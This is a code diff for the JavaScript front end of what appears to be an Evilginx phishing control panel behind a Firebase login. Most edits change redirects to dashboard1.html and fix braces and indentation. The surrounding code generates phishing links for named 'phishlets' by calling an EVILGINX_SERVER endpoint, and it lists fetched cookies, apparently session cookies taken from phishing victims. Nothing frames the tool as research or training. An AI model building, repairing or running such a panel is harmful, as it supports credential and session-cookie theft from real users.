@@ -30,11 +30,13 @@ function checkAuthStatus() {
   firebase.auth().onAuthStateChanged(function (user) {
     if (user) {
       console.log("✅ User logged in:", user.email);
+      // Redirect to dashboard1.html if the user is logged in
       if (window.location.pathname.endsWith("index.html") || window.location.pathname === "/") {
-        window.location.href = "dashboard.html";
+        window.location.href = "dashboard1.html"; // Updated to redirect to dashboard1.html
       }
     } else {
       console.log("❌ User not logged in.");
+      // Redirect to login page if not logged in
       if (window.location.pathname.includes("dashboard")) {
         window.location.href = "index.html";
       }
@@ -53,12 +55,14 @@ function login() {
   firebase.auth().signInWithEmailAndPassword(email, password)
     .then((userCredential) => {
       console.log("✅ Login successful:", userCredential.user.email);
-      window.location.href = "dashboard.html";
+      // Redirect to dashboard1.html after successful login
+      window.location.href = "dashboard1.html"; // Updated to redirect to dashboard1.html
     })
     .catch((error) => {
       console.error("❌ Login failed:", error.message);
       document.getElementById("loginError").innerText = error.message;
     });
+}
 
 // Logout function
 function logout() {
@@ -74,38 +78,37 @@ function logout() {
 
 // Generate phishing link for a specific phishlet
 function generatePhishletLink(phishlet) {
-    console.log(`🔄 Fetching preconfigured link for phishlet: ${phishlet}`);
-    fetch(`${EVILGINX_SERVER}/generate_link?phishlet=${encodeURIComponent(phishlet)}`, {
-        method: "GET",
-        mode: "cors",
-        credentials: "include",
-        headers: {
-            "Content-Type": "application/json"
-        }
-    })
-    .then(response => {
-        if (!response.ok) {
-            throw new Error(`HTTP error! Status: ${response.status}`);
-        }
-        return response.json();
-    })
-    .then(data => {
-        if (data.link) {
-            console.log(`✅ Successfully fetched link for ${phishlet}:`, data.link);
-            document.getElementById("phishletLink").innerHTML = 
-                `Generated Link: <a href="${data.link}" target="_blank">${data.link}</a>`;
-        } else {
-            throw new Error("Failed to fetch link.");
-        }
-    })
-    .catch(error => {
-        console.error("❌ Error fetching link:", error);
-        alert("Error fetching link: " + error.message);
-    });
+  console.log(`🔄 Fetching preconfigured link for phishlet: ${phishlet}`);
+  fetch(`${EVILGINX_SERVER}/generate_link?phishlet=${encodeURIComponent(phishlet)}`, {
+      method: "GET",
+      mode: "cors",
+      credentials: "include",
+      headers: {
+          "Content-Type": "application/json"
+      }
+  })
+  .then(response => {
+      if (!response.ok) {
+          throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      return response.json();
+  })
+  .then(data => {
+      if (data.link) {
+          console.log(`✅ Successfully fetched link for ${phishlet}:`, data.link);
+          document.getElementById("phishletLink").innerHTML = 
+              `Generated Link: <a href="${data.link}" target="_blank">${data.link}</a>`;
+      } else {
+          throw new Error("Failed to fetch link.");
+      }
+  })
+  .catch(error => {
+      console.error("❌ Error fetching link:", error);
+      alert("Error fetching link: " + error.message);
+  });
+}
 
-  }
-
-                                                                                                                                           // Fetch generated links history and update the table with id "generatedLinks"
+// Fetch generated links history and update the table with id "generatedLinks"
 async function viewGeneratedLinks() {
   console.log("🔄 Fetching generated links history...");
   try {
@@ -209,4 +212,4 @@ async function viewCookies() {
     console.error("❌ Error fetching cookies:", error);
     alert("Failed to load cookies: " + error.message);
   }
-)
+}
